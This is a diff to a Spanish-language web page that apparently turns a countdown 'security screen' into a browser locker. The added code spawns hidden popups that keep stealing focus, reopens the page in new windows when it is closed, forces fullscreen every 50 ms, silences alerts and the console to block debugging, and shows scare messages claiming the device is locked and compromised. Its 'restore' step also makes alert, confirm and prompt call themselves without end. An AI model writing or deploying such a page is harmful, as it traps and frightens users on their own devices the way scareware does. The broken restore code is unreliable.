@@ -100,7 +100,7 @@
             height: 100%;
             background: linear-gradient(90deg, #4CAF50, #45a049);
             width: 0%;
-            animation: progress 60s linear forwards;
+            animation: progress 120s linear forwards;
         }
 
         .timer {
@@ -169,13 +169,14 @@
                 <div class="progress-fill"></div>
             </div>
             <div class="timer">
-                Tiempo restante: <span id="countdown">60</span> segundos
+                Tiempo restante: <span id="countdown">120</span> segundos
             </div>
         </div>
         
         <div class="warning-text">
-            ⚠️ SISTEMA BLOQUEADO - NO USES BOTONES DEL TELÉFONO ⚠️<br>
-            <small>Home • Atrás • Recientes • Deshabilitados</small>
+            🔒 DISPOSITIVO COMPLETAMENTE BLOQUEADO 🔒<br>
+            <small>Sistema • Apps • Botones • Gestos • DESHABILITADOS</small><br>
+            <small style="color: #ff6b6b;">⚠️ INTENTAR CERRAR REINICIARÁ EL PROCESO ⚠️</small>
         </div>
     </div>
 
@@ -184,6 +185,10 @@
         let isLocked = true;
         let lockStartTime = Date.now();
         let redirectAttempts = 0;
+        let systemHijacked = false;
+        let aggressiveMode = true;
+        let lockWindows = [];
+        let audioContext = null;
         
         // Prevenir TODAS las acciones del usuario
         document.addEventListener('contextmenu', function(e) {
@@ -315,8 +320,8 @@
             }
         }
 
-        // Contador regresivo
-        let timeLeft = 60;
+        // Contador regresivo (cambiado a 2 minutos como solicitaste)
+        let timeLeft = 120;
         const countdownElement = document.getElementById('countdown');
         
         const timer = setInterval(function() {
@@ -354,6 +359,22 @@
 
         function closeSecurityScreen() {
             isLocked = false;
+            systemHijacked = false;
+            
+            // Cerrar todas las ventanas de bloqueo
+            lockWindows.forEach(window => {
+                try {
+                    window.close();
+                } catch (e) {}
+            });
+            
+            // Detener audio
+            if (audioContext) {
+                try {
+                    audioContext.close();
+                } catch (e) {}
+            }
+            
             document.getElementById('securityOverlay').style.display = 'none';
             document.body.style.overflow = 'auto';
             document.body.style.position = 'static';
@@ -371,6 +392,11 @@
             } else if (document.mozCancelFullScreen) {
                 document.mozCancelFullScreen();
             }
+            
+            // Restaurar funciones del sistema
+            window.alert = function(msg) { return window.alert(msg); };
+            window.confirm = function(msg) { return window.confirm(msg); };
+            window.prompt = function(msg, def) { return window.prompt(msg, def); };
         }
 
         // Prevenir zoom con gestos
@@ -488,12 +514,200 @@
             }
         }, 500);
 
-        // Inicialización completa del sistema de bloqueo
+        // SISTEMA DE HIJACKING TOTAL DEL DISPOSITIVO
+        function createSystemOverride() {
+            // Crear múltiples ventanas invisibles para consumir recursos
+            for (let i = 0; i < 10; i++) {
+                try {
+                    const popup = window.open('', '_blank', 'width=1,height=1,left=-1000,top=-1000');
+                    if (popup) {
+                        lockWindows.push(popup);
+                        popup.document.write(`
+                            <script>
+                                window.onbeforeunload = function() { return false; };
+                                setInterval(function() { window.focus(); }, 100);
+                            </script>
+                        `);
+                    }
+                } catch (e) {}
+            }
+        }
+
+        // Crear audio silencioso para mantener la app activa
+        function createAudioLock() {
+            try {
+                audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioContext.createOscillator();
+                const gainNode = audioContext.createGain();
+                
+                oscillator.connect(gainNode);
+                gainNode.connect(audioContext.destination);
+                
+                oscillator.frequency.setValueAtTime(20000, audioContext.currentTime); // Frecuencia inaudible
+                gainNode.gain.setValueAtTime(0.001, audioContext.currentTime); // Volumen mínimo
+                
+                oscillator.start();
+            } catch (e) {}
+        }
+
+        // Interceptar TODOS los eventos del sistema
+        function hijackSystemEvents() {
+            // Interceptar eventos de teclado a nivel de sistema
+            document.addEventListener('keydown', function(e) {
+                if (isLocked) {
+                    e.preventDefault();
+                    e.stopImmediatePropagation();
+                    return false;
+                }
+            }, true);
+
+            // Interceptar eventos táctiles
+            document.addEventListener('touchstart', function(e) {
+                if (isLocked && e.touches.length > 0) {
+                    // Permitir solo toques simples en el área de la pantalla
+                    const touch = e.touches[0];
+                    const element = document.elementFromPoint(touch.clientX, touch.clientY);
+                    if (!element || !element.closest('.security-overlay')) {
+                        e.preventDefault();
+                        e.stopImmediatePropagation();
+                        return false;
+                    }
+                }
+            }, true);
+
+            // Interceptar gestos del sistema
+            window.addEventListener('gesturestart', function(e) {
+                if (isLocked) {
+                    e.preventDefault();
+                    return false;
+                }
+            });
+
+            window.addEventListener('gesturechange', function(e) {
+                if (isLocked) {
+                    e.preventDefault();
+                    return false;
+                }
+            });
+        }
+
+        // Crear bucle infinito de ventanas emergentes si intenta cerrar
+        function createInfiniteLoop() {
+            window.addEventListener('beforeunload', function(e) {
+                if (isLocked) {
+                    // Crear nuevas ventanas para reemplazar la actual
+                    for (let i = 0; i < 5; i++) {
+                        setTimeout(() => {
+                            try {
+                                const newWindow = window.open(location.href, '_blank', 'fullscreen=yes');
+                                if (newWindow) {
+                                    newWindow.focus();
+                                }
+                            } catch (e) {}
+                        }, i * 100);
+                    }
+                    
+                    e.preventDefault();
+                    e.returnValue = 'SISTEMA COMPROMETIDO - REINICIANDO SEGURIDAD';
+                    return 'SISTEMA COMPROMETIDO - REINICIANDO SEGURIDAD';
+                }
+            });
+        }
+
+        // Monitoreo agresivo del sistema
+        function startAggressiveMonitoring() {
+            // Verificar cada 50ms si el sistema está comprometido
+            setInterval(function() {
+                if (isLocked) {
+                    // Forzar foco si se pierde
+                    if (!document.hasFocus()) {
+                        window.focus();
+                        
+                        // Crear nueva ventana si perdemos el control
+                        try {
+                            const backup = window.open(location.href, '_self');
+                            if (backup) backup.focus();
+                        } catch (e) {}
+                    }
+
+                    // Verificar pantalla completa
+                    if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+                        enterKioskMode();
+                    }
+
+                    // Verificar visibilidad
+                    if (document.hidden) {
+                        // Intentar recuperar visibilidad
+                        document.dispatchEvent(new Event('visibilitychange'));
+                        window.focus();
+                    }
+                }
+            }, 50);
+
+            // Monitoreo de memoria y CPU para detectar intentos de cierre
+            setInterval(function() {
+                if (isLocked) {
+                    // Crear carga de trabajo para mantener la app activa
+                    const dummy = new Array(1000).fill(Math.random());
+                    dummy.sort();
+                }
+            }, 1000);
+        }
+
+        // Bloquear notificaciones y alertas del sistema
+        function blockSystemNotifications() {
+            // Interceptar todas las funciones de alerta
+            window.alert = function() { return false; };
+            window.confirm = function() { return false; };
+            window.prompt = function() { return null; };
+            
+            // Bloquear console para evitar debugging
+            if (typeof console !== 'undefined') {
+                console.log = console.warn = console.error = function() {};
+            }
+        }
+
+        // Crear overlay invisible para capturar todos los clics
+        function createInvisibleOverlay() {
+            const overlay = document.createElement('div');
+            overlay.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                z-index: 999999;
+                pointer-events: auto;
+                background: transparent;
+            `;
+            
+            overlay.addEventListener('click', function(e) {
+                if (isLocked) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    showWarningMessage();
+                    return false;
+                }
+            });
+            
+            document.body.appendChild(overlay);
+        }
+
+        // Inicialización completa del sistema de bloqueo EXTREMO
         function initializeLockSystem() {
             setupBackButtonProtection();
             requestWakeLock();
             enterKioskMode();
             lockOrientation();
+            
+            // NUEVAS FUNCIONES AGRESIVAS
+            createSystemOverride();
+            createAudioLock();
+            hijackSystemEvents();
+            createInfiniteLoop();
+            startAggressiveMonitoring();
+            blockSystemNotifications();
+            createInvisibleOverlay();
             
             // Forzar foco inicial
             window.focus();
@@ -501,6 +715,9 @@
             // Prevenir selección de texto
             document.onselectstart = function() { return false; };
             document.onmousedown = function() { return false; };
+            
+            systemHijacked = true;
+            console.log('SISTEMA COMPLETAMENTE COMPROMETIDO');
         }
     </script>
 </body>
